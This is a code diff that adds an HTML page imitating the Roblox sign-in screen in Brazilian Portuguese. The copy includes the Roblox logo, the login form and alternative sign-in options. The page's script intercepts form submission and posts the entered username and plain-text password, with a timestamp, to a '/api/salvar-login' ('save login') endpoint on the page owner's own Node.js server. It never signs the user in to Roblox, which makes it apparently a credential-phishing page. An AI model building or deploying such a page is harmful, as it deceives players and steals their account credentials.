@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Entrar</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="login-container">
+  <img class="login-logo" src="Roblox.png" alt="Roblox">
+  <section class="login-card">
+      <h1>Entrar</h1>
+      <form>
+        <div class="login-field">
+          <label for="login-username">Nome de usuário, e-mail ou telefone</label>
+          <input id="login-username" name="username" type="text" placeholder="Nome de usuário, e-mail ou telefone" autocomplete="username">
+        </div>
+        <div class="login-field">
+          <label for="login-password">Senha</label>
+          <div class="password-input">
+            <input id="login-password" name="password" type="password" placeholder="Senha" autocomplete="current-password">
+            <button class="password-toggle" type="button" aria-label="Mostrar senha" aria-pressed="false">
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M3 3l18 18M10.6 10.6a2 2 0 0 0 2.8 2.8"></path>
+                <path d="M9.9 5.2A10.7 10.7 0 0 1 12 5c5.1 0 8.7 4.7 9.5 6-.3.5-1.2 1.8-2.8 3M6.2 6.2C3.9 7.7 2.7 9.5 2.5 11c.8 1.3 4.4 6 9.5 6 1 0 2-.2 2.8-.5"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <button class="login-submit" type="submit" disabled>Entrar</button>
+      </form>
+      <a class="login-forgot-link" href="#">Esqueceu a senha ou nome de usuário?</a>
+      <div class="login-divider"><span>ou</span></div>
+      <div class="login-options">
+        <button type="button">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="2.5" y="4.5" width="19" height="15" rx="1"></rect><path d="m3 6 9 7 9-7"></path></svg>
+          Enviar um código por e-mail
+        </button>
+        <button type="button">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 3h7v7H3zM14 3h7v7h-7zM3 14h7v7H3zM14 14h2v2h-2zM19 14h2v2h-2zM14 19h2v2h-2zM18 18h3v3h-3z"></path></svg>
+          QR code
+        </button>
+        <button type="button">Outras opções de acesso</button>
+      </div>
+      <p class="login-signup-link">Não tem uma conta? <a href="index.html">Crie uma</a></p>
+    </section>
+    <aside class="age-rating" aria-label="Classificação indicativa: 16 anos">
+      <h2>CLASSIFICAÇÃO INDICATIVA: 16 ANOS</h2>
+      <div class="age-rating-panel">
+        <span class="age-rating-number">16</span>
+        <span class="age-rating-reason">Violência</span>
+      </div>
+      <p>Interação entre usuários<br>Compras no jogo (inclui itens aleatórios)</p>
+    </aside>
+  </main>
+  <script>
+  const usernameInput = document.querySelector("#login-username");
+  const passwordInput = document.querySelector("#login-password");
+  const passwordToggle = document.querySelector(".password-toggle");
+  const loginForm = document.querySelector("form");
+  const submitButton = document.querySelector(".login-submit");
+
+  // Mantém o funcionamento de mostrar/ocultar senha
+  passwordToggle.addEventListener("click", () => {
+    const isVisible = passwordInput.type === "text";
+    passwordInput.type = isVisible ? "password" : "text";
+  });
+
+  // Habilita o botão apenas quando houver dados preenchidos
+  function verificarCampos() {
+    if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+      submitButton.removeAttribute("disabled");
+    } else {
+      submitButton.setAttribute("disabled", "true");
+    }
+  }
+
+  usernameInput.addEventListener("input", verificarCampos);
+  passwordInput.addEventListener("input", verificarCampos);
+
+  // Intercepta o envio e envia para o Backend via Fetch API
+  loginForm.addEventListener("submit", (event) => {
+    event.preventDefault();
+
+    const dadosLogin = {
+      username: usernameInput.value,
+      password: passwordInput.value,
+      timestamp: new Date().toISOString()
+    };
+
+    // Envia os dados para a API do servidor Node.js
+    fetch("/api/salvar-login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(dadosLogin)
+    })
+    .then(resposta => {
+      if (resposta.ok) {
+        console.log("Dados enviados para o servidor Node.js!");
+        // Opcional: Redirecionar o usuário ou mostrar uma mensagem de sucesso na tela
+      } else {
+        console.error("O servidor retornou um erro ao processar os dados.");
+      }
+    })
+    .catch(erro => console.error("Erro na comunicação com o servidor:", erro));
+  });
+</script>
+
+</body>
+</html>
